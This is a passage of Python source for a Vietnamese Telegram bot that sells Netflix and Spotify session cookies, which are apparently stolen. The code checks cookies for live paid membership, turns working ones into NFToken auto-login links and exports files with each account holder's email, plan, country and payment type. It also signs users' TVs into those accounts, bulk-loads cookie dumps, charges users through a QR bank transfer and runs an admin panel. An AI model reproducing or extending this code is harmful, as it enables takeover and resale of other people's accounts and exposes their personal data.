    except: pass
    msg = " ".join(context.args)
    if not msg:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="❌ Lỗi: `/broadcast <nội dung>`", parse_mode='Markdown')
        return
    conn = get_connection()
    c = conn.cursor()
    c.execute("SELECT user_id FROM users")
    users = c.fetchall()
    conn.close()
    success = 0
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Đang gửi tới {len(users)} users...")
    for u in users:
        try:
            await context.bot.send_message(chat_id=u[0], text=f"📢 *THÔNG BÁO TỪ ADMIN*\n\n{msg}", parse_mode='Markdown')
            success += 1
            await asyncio.sleep(0.05)
        except: pass
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"✅ Đã gửi thành công: {success}/{len(users)}")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_user_status(update, context): return
    query = update.callback_query
    await query.answer()
    user = update.effective_user
    name = user.first_name.replace("_", "").replace("*", "").replace("`", "").replace("[", "") if user and user.first_name else "bạn"

    if query.data == 'menu_tv_log':
        avail = get_premium_cookie_count()
        if avail == 0:
            await query.edit_message_text("❌ *Kho hiện tại đã hết cookie!* Vui lòng thử lại sau.", parse_mode='Markdown', reply_markup=kb_back())
            return
        text = (
            f"📺 *ĐĂNG NHẬP NETFLIX TRÊN TV (FREE VÔ HẠN)*\n"
            f"{DIVIDER}\n\n"
            f"1️⃣ Mở ứng dụng Netflix trên TV của bạn.\n"
            f"2️⃣ Chọn mục **Đăng nhập từ trang web** (Sign in from Web).\n"
            f"3️⃣ Nhập mã số gồm 8 ký tự hiển thị trên TV vào đây.\n\n"
            f"👉 *Ví dụ:* `1234 5678` hoặc `12345678`\n\n"
            f"💡 _Chức năng này không giới hạn lượt và hoàn toàn miễn phí!_"
        )
        await query.edit_message_text(text, parse_mode='Markdown', reply_markup=kb_back())
        context.user_data['awaiting'] = 'tv_code'

    elif query.data == 'menu_chk':
        tokens_used, tokens_max, cookies_used, cookies_max, plan_name = get_user_quota(user.id)
        if tokens_used >= tokens_max:
            await query.edit_message_text(f"❌ *Bạn đã hết lượt tạo link hôm nay ({tokens_max}/{tokens_max})*.\nHãy liên hệ Admin hoặc vào Cửa Hàng để nâng cấp gói cước nhé!", parse_mode='Markdown', reply_markup=kb_back())
            return
        avail = get_premium_cookie_count()
        if avail == 0:
            await query.edit_message_text("❌ *Kho hiện tại đã hết cookie!* Vui lòng thử lại sau hoặc báo Admin.", parse_mode='Markdown', reply_markup=kb_back())
            return

        status_msg = await query.edit_message_text(f"⏳ *Đang tự động lấy Cookie ngẫu nhiên từ Kho...*\n\n  Vui lòng chờ giây lát...", parse_mode='Markdown')
        success, attempts, max_attempts = False, 0, 5
        final_token, final_account, final_c_dict = None, None, None

        while attempts < max_attempts and not success:
            attempts += 1
            try: await status_msg.edit_text(f"⏳ *Đang test tài khoản (Lần {attempts}/{max_attempts})...*", parse_mode='Markdown')
            except: pass
            cookies = pop_premium_cookies(1, user.id)
            if not cookies: break
            c_id, c_data = cookies[0]
            c_dict_list = checker.extract_cookies_from_text(c_data)
            if not c_dict_list:
                delete_premium_cookie(c_id)
                continue
            c_dict = c_dict_list[0]
            succ, token, error, account = await asyncio.to_thread(checker.check_cookie, c_dict)
            if succ and token:
                mem_status = account.get('membership_status', 'N/A')
                if mem_status != 'CURRENT_MEMBER':
                    delete_premium_cookie(c_id)
                    continue
                success, final_token, final_account, final_c_dict = True, token, account, c_dict
                break
            else:
                if not succ or not token or account.get('membership_status') in ('FORMER_MEMBER', 'ON HOLD'):
                    delete_premium_cookie(c_id)
                else:
                    return_premium_cookie(c_id)

        if success:
            add_token_usage(user.id, 1)
            link = checker.format_nftoken_link(final_token)
            card = format_account_card(final_account, link)
            await status_msg.edit_text(card, parse_mode='Markdown', disable_web_page_preview=True, reply_markup=kb_done_with_report())
            email = final_account.get('email', 'NoEmail')
            email_clean = re.sub(r'[^\w\-_]', '', email.split('@')[0]) if email != 'N/A' and '@' in email else 'NoEmail'
            plan_clean = re.sub(r'[^\w\-_]', '', final_account.get('plan', 'NoPlan').replace(' ', '_'))
            country_clean = re.sub(r'[^\w\-_]', '', final_account.get('country', 'XX'))
            filename = f"NF_{email_clean}_{plan_clean}_{country_clean}.txt"
            file_content = (
                f"# ══════════════════════════════════════\n#  NETFLIX COOKIE + NFTOKEN\n#  Generated by {BOT_NAME} v{BOT_VERSION}\n#  {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n# ══════════════════════════════════════\n#\n"
                f"# Email:      {final_account.get('email', 'N/A')}\n# Plan:       {final_account.get('plan', 'N/A')}\n# Country:    {final_account.get('country', 'N/A')}\n# Payment:    {final_account.get('payment_method', 'N/A')}\n# CC Type:    {final_account.get('cc_type', 'N/A')}\n# Streams:    {final_account.get('max_streams', 'N/A')}\n#\n"
                f"# Auto Login Link:\n{link}\n#\n# ══════════════════════════════════════\n\n{checker.build_netscape_format(final_c_dict)}"
            )
            await context.bot.send_document(chat_id=query.message.chat_id, document=io.BytesIO(file_content.encode('utf-8')), filename=filename, reply_markup=kb_done())
        else: await status_msg.edit_text("❌ Rất tiếc, các cookie trong kho hiện đang lỗi hoặc hết hạn. Hãy báo Admin nhé!", reply_markup=kb_back())

    elif query.data == 'menu_plan':
        tokens_used, tokens_max, cookies_used, cookies_max, plan_name = get_user_quota(user.id)
        text = f"👤 *Thông tin Tài Khoản*\n━━━━━━━━━━━━━━━━━━\n🔹 **ID:** `{user.id}`\n🔹 **Gói cước:** `{plan_name}`\n\n🔋 **Giới hạn hôm nay:**\n  • Tạo link: {tokens_used}/{tokens_max if tokens_max < 99999 else 'Vô hạn'}\n  • Cookie Free: {cookies_used}/{cookies_max if cookies_max < 99999 else 'Vô hạn'}\n━━━━━━━━━━━━━━━━━━"
        await query.edit_message_text(text, parse_mode='Markdown', reply_markup=kb_back())

    elif query.data == 'menu_freecookie':
        tokens_used, tokens_max, cookies_used, cookies_max, plan_name = get_user_quota(user.id)
        if cookies_used >= cookies_max: text = f"❌ Bạn đã hết lượt nhận Cookie Free hôm nay. Hãy nâng cấp gói cước để nhận thêm nhé."
        else:
            cookie_data = claim_free_cookie(user.id)
            if not cookie_data: text = f"😔 Rất tiếc, kho Cookie Free hiện tại đang trống. Vui lòng quay lại sau!"
            else: text = f"🎁 *COOKIE FREE CỦA BẠN*\n━━━━━━━━━━━━━━━━━━\n`{cookie_data}`\n━━━━━━━━━━━━━━━━━━\n💡 Lượt nhận còn lại hôm nay: {cookies_max - cookies_used - 1}"
        await query.edit_message_text(text, parse_mode='Markdown', reply_markup=kb_back())

    elif query.data == 'menu_proxy':
        icon = proxy_manager.get_status_icon()
        text = f"{LOGO}  ›  *Cài đặt Proxy*\n{DIVIDER}\n\n  {icon}  Trạng thái:  {proxy_manager.get_status_text()}\n\n{DIVIDER_THIN}\n{FOOTER}"
        await query.edit_message_text(text, parse_mode='Markdown', reply_markup=kb_proxy())

    elif query.data == 'store_main':
        items = get_store_items()
        text = f"🛒 *CỬA HÀNG COOKIE VIP*\n{DIVIDER}\n\nMua lượt rút Cookie Premium bằng Số dư của bạn.\nSố dư hiện tại: *{get_user_economy(user.id)[0]:,.0f}đ*\n\nChọn gói bên dưới để mua:"
        buttons = [[InlineKeyboardButton(f"🎁 {it[1]} ({it[3]} lượt) - {it[2]:,.0f}đ", callback_data=f'store_buy_{it[0]}')] for it in items]
        buttons.append([InlineKeyboardButton("🏡 Về Trang Chủ", callback_data='back_main')])
        await query.edit_message_text(text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(buttons))

    elif query.data.startswith('store_buy_'):
        item_id = int(query.data.split('_')[2])
        item = get_store_item(item_id)
        if not item:
            await query.answer("Gói không tồn tại!")
            return
        success = deduct_balance(user.id, item[2])
        if success:
            add_credits(user.id, item[3])
            tx_id = add_purchase_history(user.id, item[1], item[2])
            set_plan(user.id, item[1].upper())
            await query.answer(f"✅ Mua thành công {item[1]}!", show_alert=True)

            admin_text = f"🛍 *ĐƠN HÀNG MỚI*\n\n👤 User ID: `{user.id}`\n📦 Tên Gói: `{item[1]}`\n💰 Giá: `{item[2]:,.0f}đ`\n🧾 Mã hóa đơn: `#{tx_id}`"
            try: await context.bot.send_message(chat_id=ADMIN_ID, text=admin_text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("💬 Nhắn tin cho Khách", callback_data=f"admin_reply_{user.id}")]]))
            except: pass

            items = get_store_items()
            text = f"🛒 *CỬA HÀNG COOKIE VIP*\n{DIVIDER}\n\n✅ *Đã mua thành công gói {item[1]}*\nSố dư hiện tại: *{get_user_economy(user.id)[0]:,.0f}đ*\n\n"
            buttons = [[InlineKeyboardButton(f"🎁 {it[1]} ({it[3]} lượt) - {it[2]:,.0f}đ", callback_data=f'store_buy_{it[0]}')] for it in items]
            buttons.append([InlineKeyboardButton("⚠️ Báo Lỗi", callback_data='report_error'), InlineKeyboardButton("🏡 Về Trang Chủ", callback_data='back_main')])
            await query.edit_message_text(text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(buttons))
        else:
            await query.answer("Số dư không đủ! Đang tạo mã QR...", show_alert=False)
            missing = item[2]
            url = f"https://img.vietqr.io/image/MB-17363999999999-compact2.png?amount={missing}&addInfo=NAP%20{user.id}&accountName=BUI%20MINH%20NHUT"
            caption = f"❌ *Số dư không đủ!*\n\nVui lòng quét mã QR bên dưới để nạp đủ *{missing:,.0f}đ* mua gói này.\nNội dung CK: `NAP {user.id}`\n\nSau khi chuyển khoản, bấm nút *Đã Chuyển Khoản* bên dưới để gửi Bill."
            markup = InlineKeyboardMarkup([[InlineKeyboardButton("✅ Đã Chuyển Khoản", callback_data=f"deposit_submit_bill_{missing}")], [InlineKeyboardButton("🏡 Đóng", callback_data="back_main")]])
            await query.message.reply_photo(photo=url, caption=caption, parse_mode='Markdown', reply_markup=markup)

    elif query.data == 'report_error':
        await query.edit_message_text(
            f"⚠️ *BÁO LỖI / LIÊN HỆ ADMIN*\n\n"
            f"Vui lòng nhắn tin mô tả chi tiết lỗi bạn gặp phải hoặc gửi kèm hình ảnh chụp màn hình.\n"
            f"Hệ thống sẽ chuyển báo cáo của bạn đến Admin, hoặc bạn có thể nhắn thẳng cho Telegram: `@mnhutdznecon`.",
            parse_mode='Markdown', reply_markup=kb_back()
        )
        context.user_data['awaiting'] = 'report_error'

    elif query.data == 'report_cookie_error':
        try:
            original_text = query.message.text or '(Không có nội dung)'
            admin_text = f"⚠️ *BÁO LỖI COOKIE TỪ KHÁCH*\n\n👤 User: `{user.id}` ({name})\n📅 Thời gian: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n\n📝 Nội dung cookie đã gửi:\n{original_text[:1500]}"
            admin_markup = InlineKeyboardMarkup([[InlineKeyboardButton("💬 Trả lời Khách", callback_data=f"admin_reply_{user.id}")]])
            await context.bot.send_message(chat_id=ADMIN_ID, text=admin_text, parse_mode='Markdown', reply_markup=admin_markup)
            await query.answer("✅ Đã báo lỗi đến Admin! Cảm ơn bạn.", show_alert=True)
        except Exception:
            await query.answer("❌ Gửi báo lỗi thất bại, vui lòng thử lại.", show_alert=True)

    elif query.data == 'deposit_main':
        await query.edit_message_text(f"💰 *NẠP TIỀN VÀO TÀI KHOẢN*\n\nVui lòng nhắn tin *số tiền* bạn muốn nạp (VD: `50000`).\nHệ thống sẽ tạo mã QR thanh toán tự động cho bạn.", parse_mode='Markdown', reply_markup=kb_back())
        context.user_data['awaiting'] = 'deposit_enter_amount'

    elif query.data.startswith('deposit_submit_bill_'):
        amt = query.data.split('_')[3]
        await query.edit_message_caption(caption=f"✅ *Đã xác nhận thanh toán {int(amt):,.0f}đ*\n\nVui lòng nhắn tin gửi kèm hình ảnh Bill (biên lai) để Admin duyệt nạp tiền.", parse_mode='Markdown')
        context.user_data['awaiting'] = f'deposit_bill_{amt}'

    elif query.data.startswith('admin_approve_tx_'):
        if user.id != ADMIN_ID: return
        tx_id = int(query.data.split('_')[3])
        success, uid, amount = approve_transaction(tx_id)
        if success:
            await query.edit_message_text(f"✅ Đã duyệt giao dịch #{tx_id} thành công!", parse_mode='Markdown')
            try: await context.bot.send_message(chat_id=uid, text=f"✅ *NẠP TIỀN THÀNH CÔNG*\n\nTài khoản của bạn đã được cộng thêm *{amount:,.0f}đ* từ giao dịch `#{tx_id}`.", parse_mode='Markdown')
            except: pass
        else:
            await query.edit_message_text(f"❌ Giao dịch #{tx_id} không tồn tại hoặc đã được xử lý.", parse_mode='Markdown')

    elif query.data.startswith('admin_reject_tx_'):
        if user.id != ADMIN_ID: return
        tx_id = int(query.data.split('_')[3])
        uid = reject_transaction(tx_id)
        await query.edit_message_text(f"🚫 Đã từ chối giao dịch #{tx_id}.", parse_mode='Markdown')
        if uid:
            try:
                reject_msg = (f"❌ *NẠP TIỀN THẤT BẠI*\n\nGiao dịch `#{tx_id}` của bạn đã bị từ chối.\n\n"
                              f"Nếu có sai sót, vui lòng dùng lệnh `/baoloi` hoặc nhắn thẳng cho Telegram: `@mnhutdznecon` để được hỗ trợ.")
                await context.bot.send_message(chat_id=uid, text=reject_msg, parse_mode='Markdown')
            except: pass

    elif query.data.startswith('admin_reply_'):
        if user.id != ADMIN_ID: return
        target_uid = query.data.split('_')[2]
        await query.message.reply_text(f"📝 Nhập nội dung tin nhắn để gửi cho User `{target_uid}`:")
        context.user_data['awaiting'] = f'admin_send_reply_{target_uid}'

    elif query.data == 'admin_lookup_bill':
        if user.id != ADMIN_ID: return
        await query.edit_message_text("🔍 *TRA CỨU HÓA ĐƠN MUA GÓI*\n\nVui lòng nhắn tin *Mã hóa đơn* (ID) bạn muốn kiểm tra (Ví dụ: `12`).", parse_mode='Markdown', reply_markup=kb_admin())
        context.user_data['awaiting'] = 'admin_lookup_bill'

    elif query.data == 'extract_vip':
        bal, cred = get_user_economy(user.id)
        text = f"🚀 *LẤY COOKIE (ĐÃ MUA)*\n{DIVIDER}\n\n💎 Bạn đang có: *{cred}* lượt lấy cookie.\n\nVui lòng nhắn tin *số lượng* cookie bạn muốn lấy (VD: `5`).\nHệ thống sẽ tự động lọc cookie sống và trả về Link NFToken cho bạn."
        await query.edit_message_text(text, parse_mode='Markdown', reply_markup=kb_back())
        context.user_data['awaiting'] = 'extract_vip_count'

    elif query.data == 'purchase_history':
        history = get_purchase_history(user.id)
        if not history: text = "📜 *LỊCH SỬ MUA GÓI*\n\nBạn chưa mua gói nào."
        else:
            text = "📜 *LỊCH SỬ MUA GÓI*\n\n"
            for h in history[:10]:
                date_str = h[2].split('.')[0]
                text += f"🔹 *{h[0]}* - {h[1]:,.0f}đ\n🕒 `{date_str}`\n\n"
            if len(history) > 10: text += "... và các giao dịch cũ hơn."
        await query.edit_message_text(text, parse_mode='Markdown', reply_markup=kb_back())

    elif query.data == 'menu_stats':
        uid = update.effective_user.id if update.effective_user else 0
        stats = get_user_stats(uid)
        total = stats['total']
        success = stats['success']
        rate = round(success / total * 100, 1) if total > 0 else 0
        ep_host = API_ENDPOINTS[checker.last_working_endpoint].split('//')[1].split('/')[0]
        text = f"{LOGO}  ›  *Thống kê*\n{DIVIDER}\n\n  👤 *{name}*\n\n  📋 Đã kiểm tra:     *{total}*\n  ✅ Thành công:       *{success}*\n  📈 Tỷ lệ:               *{rate}%*\n\n  {DIVIDER_THIN}\n\n  🔗 Endpoint:  `{ep_host}`\n  📡 Endpoints:  *{len(API_ENDPOINTS)}*\n  🌐 Proxy:        {proxy_manager.get_status_icon()} {proxy_manager.get_status_text()}\n\n  {DIVIDER_THIN}\n  {FOOTER}"
        await query.edit_message_text(text, parse_mode='Markdown', reply_markup=kb_back())

    elif query.data == 'menu_help':
        text = f"{LOGO}  ›  *Hướng dẫn*\n{DIVIDER}\n\n*1. Cửa hàng & Nạp tiền:*\n   Nạp tiền vào Số dư để mua các\n   gói Lượt Rút Cookie chất lượng.\n\n*2. Rút Cookie VIP:*\n   Trích xuất tự động cookie sống\n   từ kho thành NFToken.\n\n*3. Đăng nhập TV:*\n   Liên kết TV qua mã 8 ký tự,\n   miễn phí và không giới hạn.\n\n  {DIVIDER_THIN}\n  {FOOTER}"
        await query.edit_message_text(text, parse_mode='Markdown', reply_markup=kb_back())

    elif query.data == 'admin_setplan':
        if user.id != ADMIN_ID: return
        await query.edit_message_text("✏️ *ĐỔI GÓI CƯỚC*\n\nVui lòng nhắn tin theo cú pháp:\n`<user_id> <tên_gói>`\n\nVí dụ: `123456789 VIP`", parse_mode='Markdown', reply_markup=kb_admin())
        context.user_data['awaiting'] = 'admin_setplan'

    elif query.data == 'admin_addplan':
        if user.id != ADMIN_ID: return
        await query.edit_message_text("➕ *TẠO GÓI MỚI*\n\nVui lòng nhắn tin theo cú pháp:\n`<tên_gói> <lượt_tạo_link> <lượt_nhận_cookie>`\n\nVí dụ: `PRO 999 5`", parse_mode='Markdown', reply_markup=kb_admin())
        context.user_data['awaiting'] = 'admin_addplan'

    elif query.data == 'admin_addstore':
        if user.id != ADMIN_ID: return
        await query.edit_message_text("🛒 *THÊM GÓI VÀO CỬA HÀNG*\n\nVui lòng nhắn tin theo cú pháp:\n`<tên_gói> <giá> <lượt_rút_cookie>`\n\nVí dụ: `VIP1 20000 10`\n\n⚠️ Tên gói phải đã tồn tại.", parse_mode='Markdown', reply_markup=kb_admin())
        context.user_data['awaiting'] = 'admin_addstore'

    elif query.data == 'admin_delstore':
        if user.id != ADMIN_ID: return
        items = get_store_items()
        if not items:
            await query.edit_message_text("❌ Cửa hàng hiện đang trống, không có gói nào để xóa.", reply_markup=kb_admin())
            return
        buttons = [[InlineKeyboardButton(f"🗑 {item[1]} ({item[3]} lượt) - {item[2]:,.0f}đ", callback_data=f'admin_delstore_{item[0]}')] for item in items]
        buttons.append([InlineKeyboardButton("🏡 Quay Lại", callback_data='admin_panel')])
        await query.edit_message_text("🗑 *XÓA GÓI CỬA HÀNG*\n\nChọn gói muốn xóa:", parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(buttons))

    elif query.data.startswith('admin_delstore_'):
        if user.id != ADMIN_ID: return
        item_id = int(query.data.split('_')[2])
        delete_store_item(item_id)
        await query.answer("✅ Đã xóa gói khỏi cửa hàng!", show_alert=True)
        await query.edit_message_text("✅ Đã xóa gói thành công.", reply_markup=kb_admin())

    elif query.data == 'admin_choose_add_type':
        if user.id != ADMIN_ID: return
        buttons = InlineKeyboardMarkup([
            [InlineKeyboardButton("🍿 Nạp Cookie Netflix", callback_data='admin_addcookie_vip')],
            [InlineKeyboardButton("🎧 Nạp Cookie Spotify", callback_data='admin_upload_spotify_init')],
            [InlineKeyboardButton("🏡 Quay Lại", callback_data='admin_panel')]
        ])
        await query.edit_message_text("🍪 *CHỌN LOẠI COOKIE MUỐN NẠP VÀO KHO:*", parse_mode='Markdown', reply_markup=buttons)

    elif query.data == 'admin_upload_spotify_init':
        if user.id != ADMIN_ID: return
        await query.edit_message_text("🎧 *NẠP COOKIE SPOTIFY*\n\nVui lòng gửi file `.zip` chứa các file `.txt` cookie.\nBot sẽ tự động giải nén, chuyển sang JSON và chỉ lọc tài khoản **Premium** / **Chủ Family**.", parse_mode='Markdown', reply_markup=kb_admin())
        context.user_data['awaiting'] = 'admin_upload_cookie_spotify'

    elif query.data == 'admin_get_spotify':
        if user.id != ADMIN_ID: return
        buttons = InlineKeyboardMarkup([
            [InlineKeyboardButton("🎵 Lấy Premium Thường", callback_data='admin_pull_spotify_PREMIUM')],
            [InlineKeyboardButton("👨‍👩‍👧‍👦 Lấy Chủ Family", callback_data='admin_pull_spotify_FAMILY_OWNER')],
            [InlineKeyboardButton("🏡 Quay Lại", callback_data='admin_panel')]
        ])
        await query.edit_message_text("🎧 *TRÍCH XUẤT COOKIE SPOTIFY (JSON)*\n\nBạn muốn lấy loại tài khoản nào?", parse_mode='Markdown', reply_markup=buttons)

    elif query.data.startswith('admin_pull_spotify_'):
        if user.id != ADMIN_ID: return

        plan_type = query.data.replace('admin_pull_spotify_', '')

        cookie_data = get_spotify_cookie_from_db(plan_type)
        plan_display = plan_type.replace('_', ' ') # FIX MARKDOWN LỖI

        if not cookie_data:
            await query.answer(f"❌ Kho {plan_display} hiện tại đang trống!", show_alert=True)
            return

        c_id, json_str, email, country = cookie_data

        filename = f"Spotify_{plan_type}_{country}_{email.split('@')[0]}.json"

        caption = (
            f"✅ *ĐÃ TRÍCH XUẤT SPOTIFY COOKIE*\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"📧 **Email:** `{email}`\n"
            f"🌍 **Quốc gia:** {country}\n"
            f"🏷 **Loại:** {plan_display}\n\n"
            f"💡 _Import file JSON này vào EditThisCookie để đăng nhập._"
        )

        await context.bot.send_document(
            chat_id=update.effective_chat.id,
            document=io.BytesIO(json_str.encode('utf-8')),
            filename=filename,
            caption=caption,
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔁 Lấy Thêm", callback_data='admin_get_spotify'), InlineKeyboardButton("🏡 Đóng", callback_data='admin_panel')]])
        )
        try: await query.message.delete()
        except: pass

    elif query.data == 'admin_addcookie_vip':
        if user.id != ADMIN_ID: return
        buttons = InlineKeyboardMarkup([[InlineKeyboardButton("⚡ Nạp Nhanh (Không Check)", callback_data='admin_upload_fast_vip')], [InlineKeyboardButton("🔍 Check & Nạp (Lọc Sống)", callback_data='admin_upload_check_vip')], [InlineKeyboardButton("🏡 Quay Lại", callback_data='back_main')]])
        await query.edit_message_text("🍪 *THÊM COOKIE VÀO KHO BÁN*\n\nChọn chế độ nạp:\n\n⚡ *Nạp Nhanh* — Nạp thẳng, không check (Tốc độ cao).\n🔍 *Check & Nạp* — Kiểm tra đa luồng và chỉ nạp SỐNG.", parse_mode='Markdown', reply_markup=buttons)

    elif query.data == 'admin_upload_fast_vip':
        if user.id != ADMIN_ID: return
        await query.edit_message_text("⚡ *NẠP NHANH*\n\nVui lòng tải lên file `.txt` hoặc `.zip` chứa cookie.\nBot sẽ nạp thẳng tất cả vào kho VIP mà *không check*.", parse_mode='Markdown', reply_markup=kb_admin())
        context.user_data['awaiting'] = 'admin_upload_cookie_vip_fast'

    elif query.data == 'admin_upload_check_vip':
        if user.id != ADMIN_ID: return
        await query.edit_message_text("🔍 *CHECK & NẠP (ĐA LUỒNG)*\n\nVui lòng tải lên file `.txt` hoặc `.zip` chứa cookie.\nBot sẽ kiểm tra đa luồng (15 workers) và chỉ nạp cookie *SỐNG (Current Member)* vào kho.", parse_mode='Markdown', reply_markup=kb_admin())
        context.user_data['awaiting'] = 'admin_upload_cookie_vip'

    elif query.data == 'admin_cookie_inventory':
        if user.id != ADMIN_ID: return
        nf_count = get_premium_cookie_count()
        sp_prem = get_spotify_cookie_count('PREMIUM')
        sp_fam = get_spotify_cookie_count('FAMILY_OWNER')

        buttons = InlineKeyboardMarkup([
            [InlineKeyboardButton("🧹 Xóa Cookie Lỗi (Netflix)", callback_data='admin_purge_dead')],
            [InlineKeyboardButton("💣 Xóa All Netflix", callback_data='admin_purge_all_nf'),
             InlineKeyboardButton("💣 Xóa All Spotify", callback_data='admin_purge_all_sp')],
            [InlineKeyboardButton("🏡 Quay Lại", callback_data='admin_panel')]
        ])
        text = (
            f"📦 *KHO COOKIE VIP*\n"
            f"━━━━━━━━━━━━━━━━━━\n"
            f"🍿 **Netflix:** `{nf_count}` cookie\n\n"
            f"🎧 **Spotify Premium:** `{sp_prem}` cookie\n"
            f"👨‍👩‍👧‍👦 **Spotify Family:** `{sp_fam}` cookie\n"
        )
        await query.edit_message_text(text, parse_mode='Markdown', reply_markup=buttons)

    elif query.data == 'admin_purge_all_nf':
        if user.id != ADMIN_ID: return
        buttons = InlineKeyboardMarkup([[InlineKeyboardButton("✅ Xác Nhận Xóa Hết", callback_data='admin_purge_all_nf_confirm')], [InlineKeyboardButton("❌ Hủy", callback_data='admin_cookie_inventory')]])
        await query.edit_message_text("⚠️ *BẠN CÓ CHẮC MUỐN XÓA TOÀN BỘ COOKIE NETFLIX TRONG KHO?*", parse_mode='Markdown', reply_markup=buttons)

    elif query.data == 'admin_purge_all_sp':
        if user.id != ADMIN_ID: return
        buttons = InlineKeyboardMarkup([[InlineKeyboardButton("✅ Xác Nhận Xóa Hết", callback_data='admin_purge_all_sp_confirm')], [InlineKeyboardButton("❌ Hủy", callback_data='admin_cookie_inventory')]])
        await query.edit_message_text("⚠️ *BẠN CÓ CHẮC MUỐN XÓA TOÀN BỘ COOKIE SPOTIFY TRONG KHO?*", parse_mode='Markdown', reply_markup=buttons)

    elif query.data == 'admin_purge_all_nf_confirm':
        if user.id != ADMIN_ID: return
        deleted = purge_all_premium_cookies()
        await query.edit_message_text(f"💣 *ĐÃ XÓA TOÀN BỘ KHO NETFLIX!*\n\nĐã xóa *{deleted}* cookie.", parse_mode='Markdown', reply_markup=kb_admin())

    elif query.data == 'admin_purge_all_sp_confirm':
        if user.id != ADMIN_ID: return
        conn = get_connection()
        c = conn.cursor()
        c.execute("DELETE FROM spotify_cookies")
        deleted = c.rowcount
        conn.commit()
        conn.close()
        await query.edit_message_text(f"💣 *ĐÃ XÓA TOÀN BỘ KHO SPOTIFY!*\n\nĐã xóa *{deleted}* cookie.", parse_mode='Markdown', reply_markup=kb_admin())

    elif query.data == 'admin_purge_dead':
        if user.id != ADMIN_ID: return
        all_cookies_raw = get_all_premium_cookies()
        if not all_cookies_raw:
            await query.edit_message_text("❌ Kho đang trống, không có cookie nào để kiểm tra.", reply_markup=kb_admin())
            return
        total = len(all_cookies_raw)
        status_msg = await query.edit_message_text(f"🧹 *Đang quét {total} cookie trong kho...*\n\n  Vui lòng chờ...", parse_mode='Markdown')
        dead_ids, live_count, last_update = [], 0, time.time()
        for i, (c_id, c_data) in enumerate(all_cookies_raw, 1):
            c_dict_list = checker.extract_cookies_from_text(c_data)
            if not c_dict_list:
                dead_ids.append(c_id)
                continue
            try:
                success, token, error, account = await asyncio.wait_for(asyncio.to_thread(checker.check_cookie, c_dict_list[0]), timeout=15)
                if success and token:
                    mem_status = account.get('membership_status', 'N/A')
                    if mem_status != 'CURRENT_MEMBER': dead_ids.append(c_id)
                    else: live_count += 1
                else: dead_ids.append(c_id)
            except Exception: dead_ids.append(c_id)
            now = time.time()
            if now - last_update >= 3:
                try: await status_msg.edit_text(f"🧹 *Đang quét cookie...*\n\n  📋 Tiến độ: *{i}* / *{total}* ({round(i/total*100)}%)\n  ✅ Sống: *{live_count}*\n  ❌ Lỗi: *{len(dead_ids)}*", parse_mode='Markdown')
                except: pass
                last_update = now
        for c_id in dead_ids: delete_premium_cookie(c_id)
        await status_msg.edit_text(f"🧹 *HOÀN TẤT DỌN KHO!*\n\n✅ Cookie sống: *{live_count}*\n🗑 Đã xóa: *{len(dead_ids)}* cookie lỗi/hết hạn", parse_mode='Markdown', reply_markup=kb_admin())

    elif query.data == 'admin_toggle_mtn':
        if user.id != ADMIN_ID: return
        global MAINTENANCE_MODE
        MAINTENANCE_MODE = not MAINTENANCE_MODE
        await query.answer(f"Đã {'BẬT' if MAINTENANCE_MODE else 'TẮT'} chế độ bảo trì!", show_alert=True)
        await query.edit_message_reply_markup(reply_markup=kb_admin())

    elif query.data == 'admin_add_discount':
        if user.id != ADMIN_ID: return
        await query.edit_message_text("🎟 *TẠO MÃ KHUYẾN MÃI*\n\nVui lòng nhắn tin theo cú pháp:\n`<TÊN_MÃ> <SỐ_TIỀN> <LƯỢT_DÙNG>`\n\nVí dụ: `SALE50K 50000 10`", parse_mode='Markdown', reply_markup=kb_admin())
        context.user_data['awaiting'] = 'admin_add_discount'

    elif query.data == 'admin_ban_user':
        if user.id != ADMIN_ID: return
        await query.edit_message_text("🔒 *KHÓA TÀI KHOẢN (BAN)*\n\nVui lòng nhắn tin ID của người dùng cần khóa.\nVí dụ: `123456789`", parse_mode='Markdown', reply_markup=kb_admin())
        context.user_data['awaiting'] = 'admin_ban_user'

    elif query.data == 'admin_unban_user':
        if user.id != ADMIN_ID: return
        await query.edit_message_text("🔓 *MỞ KHÓA TÀI KHOẢN (UNBAN)*\n\nVui lòng nhắn tin ID của người dùng cần mở khóa.\nVí dụ: `123456789`", parse_mode='Markdown', reply_markup=kb_admin())
        context.user_data['awaiting'] = 'admin_unban_user'

    elif query.data.startswith('admin_unban_'):
        if user.id != ADMIN_ID: return
        uid = int(query.data.split('_')[2])
        unban_user(uid)
        await query.answer(f"Đã mở khóa user {uid}!", show_alert=True)

    elif query.data == 'admin_list_users':
        if user.id != ADMIN_ID: return
        users = get_all_users()
        total, banned = len(users), sum(1 for u in users if u[3] == 1)
        text = f"👥 *DANH SÁCH NGƯỜI DÙNG*\nTổng số: {total} | Bị khóa: {banned}\n\n"
        for u in users[:50]: text += f"{'🚫' if u[3] == 1 else '✅'} ID: `{u[0]}` | Tên: {u[1]} | Gói: {u[2]}\n"
        if total > 50: text += "\n... (và nhiều user khác)"
        await query.edit_message_text(text, parse_mode='Markdown', reply_markup=kb_admin())

    elif query.data == 'admin_list_banned':
        if user.id != ADMIN_ID: return
        banned_users = get_banned_users()
        if not banned_users: text = "✅ *Không có user nào bị khóa.*"
        else:
            text = f"🚫 *DANH SÁCH USER BỊ KHÓA ({len(banned_users)})*\n\n"
            for u in banned_users: text += f"ID: `{u[0]}` | Tên: {u[1]}\n"
        await query.edit_message_text(text, parse_mode='Markdown', reply_markup=kb_admin())

    elif query.data == 'admin_broadcast':
        if user.id != ADMIN_ID: return
        await query.edit_message_text("📢 *GỬI THÔNG BÁO*\n\nVui lòng nhắn tin nội dung bạn muốn gửi đến tất cả người dùng.", parse_mode='Markdown', reply_markup=kb_admin())
        context.user_data['awaiting'] = 'admin_broadcast'

    elif query.data == 'cancel_task':
        chat_id = update.effective_chat.id
        if chat_id in active_tasks:
